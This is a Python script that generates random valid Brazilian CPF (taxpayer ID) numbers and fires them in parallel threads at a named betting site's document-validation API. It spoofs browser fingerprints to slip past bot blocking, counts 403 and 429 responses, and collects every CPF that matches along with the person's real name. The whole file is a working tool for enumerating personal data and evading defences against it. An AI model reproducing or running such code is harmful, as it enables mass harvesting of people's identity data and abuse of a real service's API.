#!/usr/bin/env python3
"""
Injetor Rápido - Máxima velocidade com threads
"""
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi import requests

# Fingerprints válidos
FPS = ["chrome120", "chrome119", "chrome110", "chrome99", "edge101", "safari15_5"]

# Resultados globais
lock = threading.Lock()
resultados = {"validos": [], "ok": 0, "blocked": 0, "rate_limit": 0, "erro": 0}

def gerar_cpf():
    cpf = [random.randint(0, 9) for _ in range(9)]
    soma = sum((10 - i) * cpf[i] for i in range(9))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    soma = sum((11 - i) * cpf[i] for i in range(10))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    return ''.join(map(str, cpf))

def worker(thread_id):
    """Worker que faz uma requisição"""
    cpf = gerar_cpf()
    fp = FPS[thread_id % len(FPS)]
    
    try:
        session = requests.Session(impersonate=fp)
        r = session.post(
            "https://7k.bet.br/api/documents/validate",
            json={"number": cpf, "type": "cpf"},
            headers={"Content-Type": "application/json", "Origin": "https://7k.bet.br"},
            timeout=10
        )
        
        status = r.status_code
        
        with lock:
            if status == 200:
                try:
                    nome = r.json().get("data", {}).get("name", "N/A")
                except:
                    nome = "N/A"
                resultados["validos"].append({"cpf": cpf, "nome": nome})
                resultados["ok"] += 1
                print(f"✅ {cpf[:3]}.{cpf[3:6]}... | {nome[:20]}")
            elif status == 400:
                resultados["ok"] += 1
                print(f"❌ {cpf[:3]}.{cpf[3:6]}...")
            elif status == 403:
                resultados["blocked"] += 1
                print(f"🚫 {cpf[:3]}.{cpf[3:6]}...")
            elif status == 429:
                resultados["rate_limit"] += 1
                print(f"⏳ {cpf[:3]}.{cpf[3:6]}...")
            else:
                resultados["erro"] += 1
        
        return status
        
    except Exception as e:
        with lock:
            resultados["erro"] += 1
        return -1

def injetar(num_threads=20, num_rodadas=5):
    """Injeta requisições em paralelo"""
    global resultados
    
    print("="*50)
    print(f"💉 INJETOR RÁPIDO - {num_threads} threads x {num_rodadas} rodadas")
    print("="*50)
    
    inicio = time.time()
    total_requests = num_threads * num_rodadas
    
    for rodada in range(num_rodadas):
        print(f"\n🚀 Rodada {rodada+1}/{num_rodadas}:")
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(worker, i) for i in range(num_threads)]
            for f in as_completed(futures):
                pass  # Aguarda completar
    
    tempo = time.time() - inicio
    
    print("\n" + "="*50)
    print("📊 RESUMO FINAL")
    print("="*50)
    print(f"Total: {total_requests} requisições em {tempo:.1f}s")
    print(f"Velocidade: {total_requests/tempo:.1f} req/s")
    print(f"\n✅ OK (200/400): {resultados['ok']}")
    print(f"🚫 Blocked (403): {resultados['blocked']}")
    print(f"⏳ Rate Limit (429): {resultados['rate_limit']}")
    print(f"💥 Erros: {resultados['erro']}")
    
    if resultados["validos"]:
        print(f"\n🎯 CPFs VÁLIDOS: {len(resultados['validos'])}")
        for v in resultados["validos"]:
            print(f"   {v['cpf'][:3]}.{v['cpf'][3:6]}.{v['cpf'][6:9]}-{v['cpf'][9:]} | {v['nome']}")

if __name__ == "__main__":
    injetar(num_threads=20, num_rodadas=5)  # 100 requisições total







